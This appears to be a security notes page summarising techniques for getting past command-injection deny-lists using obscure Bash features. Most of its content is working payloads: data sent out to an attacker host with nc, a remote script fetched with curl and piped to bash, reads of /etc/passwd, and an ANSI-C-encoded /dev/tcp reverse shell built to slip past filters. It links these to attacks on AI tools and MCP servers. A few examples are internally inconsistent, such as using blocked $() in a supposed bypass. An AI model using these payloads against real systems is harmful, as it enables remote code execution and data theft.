# Esoteric Command Injection

**Source:** nitewl.com/esoteric-command-injection
**Author:** nitewl
**Date:** February 20, 2026

## Overview

When strict deny-lists block common command injection characters (`$()`, ``;|&``), esoteric Bash features bypass sanitization: process substitution `<()>`, Bash 5.3+ ksh-style command substitution, ANSI-C quoting, and shell parameter expansion.

## Technique 1: Sauron Eye `<()>`

**Allowed chars:** `<()>`  
**Blocked:** everything else from the OWASP strict deny-list

### Process Substitution for Command Injection

```bash
# Pipe replacement: commandA > >(commandB)
echo "system: $(uname -a)" > >(tee /tmp/output | nc attacker 4444)

# Multi-command injection
uname -a > >(cat /etc/passwd) > >(id)

# File-write injection
echo "payload" >()  # creates /dev/fd/N pipe for command
echo "args" $(</tmp/malicious_input)  # reads process output as filename
```

### Information Disclosure

```bash
# Read any file through process substitution
./read10Lines.sh <(last)         # reads command output as file
./process.sh < <(curl http://attacker/payload.sh)  # pipe command to stdin
```

### Here Strings `<<<`

Here strings perform shell expansions including command substitution, making them useful for stdin poisoning:

```bash
command --read-stdin <<< "$(malicious_command)"
command --read-stdin <<< "$(curl http://attacker/payload.sh | bash)"
```

## Technique 2: Confused Face `{$\\='}`

**Allowed chars:** `{$\='}`  
**Blocked:** everything else including `();`

### Bash 5.3+ ksh-style Command Substitution

```bash
${ command; }   # New in Bash 5.3+ - korn shell style
```

This notation uses `${}` which is normally safe (environment variables), but with a space after `{` and semicolon before `}` it becomes command substitution.

### Encoding the Semicolon via ANSI-C Quoting

Since `;` is in the deny-list, encode it:
```bash
$'\x3b'   # hex for ;  
$'\073'   # octal for ;
```

### Shell Parameter Expansion for One-Shot

```bash
# Assign ANSI-C encoded payload to variable, expand it simultaneously
${_=$'\x3b'}
# Result: ;  (the semicolon character)
```

### Full Payload

```bash
${_=$'id'$'\073'}   # expands to: id;

# With newline instead of semicolon for closing:
${_=$'id'$'\x0a'}   # expands to: id\n

# Complex payload with /dev/tcp reverse shell:
${_=$'exec 5<>/dev/tcp/10.0.0.1/8080;cat <&5|while read a;do sh -c $a 2>&1 >&5;done'$'\073'}
```

### ANSI-C Quoting Reference

| Escape | Character | Hex | Octal |
|--------|-----------|-----|-------|
| `\n` | newline | `\x0a` | `\012` |
| `;` | semicolon | `\x3b` | `\073` |
| `\|` | pipe | `\x7c` | `\174` |
| `&` | ampersand | `\x26` | `\046` |
| `$` | dollar | `\x24` | `\044` |
| `\`` | backtick | `\x60` | `\140` |
| `(` | open paren | `\x28` | `\050` |
| `)` | close paren | `\x29` | `\051` |

## Technique 3: Unset Variable Poisoning

```bash
# If $ABCDEF is unset, assign arbitrary value
command1 <<< "$(id)"        # inject into stdin
${ABCDEF=$'--malicious-arg'}  # assign to unset variable
command2 $ABCDEF              # variable now poisons command2's arguments
```

## Deny-List Comparison

| Character | OWASP | Sauron Eye | Confused Face |
|-----------|-------|------------|---------------|
| `$()` | Blocked | — | — |
| `` ` `` | Blocked | — | — |
| `;` | Blocked | — | Encoded |
| `\|` | Blocked | — | Encoded |
| `<()` | Blocked | **Allowed** | — |
| `{$\='}` | Blocked | — | **Allowed** |
| `$'...'` | Blocked | — | **Allowed** |

## Relevance to This Workspace

- **CWE-78**: OS Command Injection — the canonical CWE for all techniques described
- **CWE-116**: Improper Output Encoding — ANSI-C quoting is an encoding bypass
- **Attacking-AI-Application-and-System/** — MCP servers and AI tools often exec shell commands
- **LLM-Output-Attacks/** — LLM code injection paths that lead to shell execution
